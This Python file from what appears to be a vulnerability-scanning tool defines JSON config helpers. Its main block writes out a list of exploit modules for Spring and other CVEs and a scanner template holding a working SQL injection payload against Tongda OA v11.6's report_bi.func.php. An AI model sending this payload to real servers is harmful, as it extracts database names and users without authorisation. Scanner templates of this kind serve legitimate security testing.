# coding:utf-8

import json

class JsonMethod:
    def JsonRead(self,json_file):
        with open(json_file, "r", encoding="utf-8") as f:
            content = json.load(f)
        return content
    def JsonWrite(self,data,json_file):
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        return True
    def FofaConfigRead(self):
        self.fofapath = './config/fofa.json'
        self.fofaconfig = self.JsonRead(self.fofapath)
        return self.fofaconfig
    def ProxyConfigRead(self):
        self.proxypath = './config/proxy.json'
        self.proxyconfig = self.JsonRead(self.proxypath)
        return self.proxyconfig
    def LogsConfigRead(self):
        self.logpath = './config/logs.json'
        self.logconfig = self.JsonRead(self.logpath)
        return self.logconfig
    def VulnsConfigRead(self):
        self.vulnspath = './config/vulns.json'
        self.vulnsconfig = self.JsonRead(self.vulnspath)
        return self.vulnsconfig
if __name__ == '__main__':
    data = {
        "list":[
            "CVE-2021-21234","CVE-2022-22963","CVE-2022-22965",
            "JeeSpring-2023","JolokiaRCE","nakeYAMLRCE"
            ],
        "path":{
            "CVE-2021-21234": "../vuls/CVE_2021_21234.py",
            "CVE-2022-22963": "../vuls/CVE_2022_22963.py",
            "CVE-2022-22965": "../vuls/CVE_2022_22965.py",
            "JeeSpring-2023": "../vuls/JeeSpring_2023.py",
            "JolokiaRCE": "../vuls/JeeSpring_2023.py",
            "nakeYAMLRCE": "../vuls/SnakeYAML_RCE.py"
            }
    }
    '''data = {
        "switch": 0,
        "scanlog_path":"../logs/urls.log",
        "vulnlog_path":"../logs/vuln.log"
        }'''
    data = {'id': '通达OA v11.6 insert SQL注入漏洞', 'info': {'name': 'Office Anywhere TongDa - Path Traversal', 'author': 'pikpikcu', 'severity': 'critical', 'description': '通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息', 'reference': ['https://peiqi.wgpsec.org/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html'], 'classification': {'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'cvss-score': 10.0, 'cwe-id': 'CWE-77'}, 'tags': 'tongda,lfi', 'metadata': {'max-request': 1}}, 'http': [{'method': ['POST'], 'path': ['{{BaseURL}}/general/bi_design/appcenter/report_bi.func.php'], 'Rheader': ['Content-Type:application/x-www-form-urlencoded & Accept-Encoding:gzip'], 'body': ['_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&\n'], 'matchers-condition': 'and', 'matchers': [{'type': 'word', 'part': 'body', 'words': ['td_oa']}, {'type': 'status', 'status': [200]}]}]}

    var = JsonMethod()
    data = var.JsonWrite(data,'CVE_2021_21234.json')
    print(data)

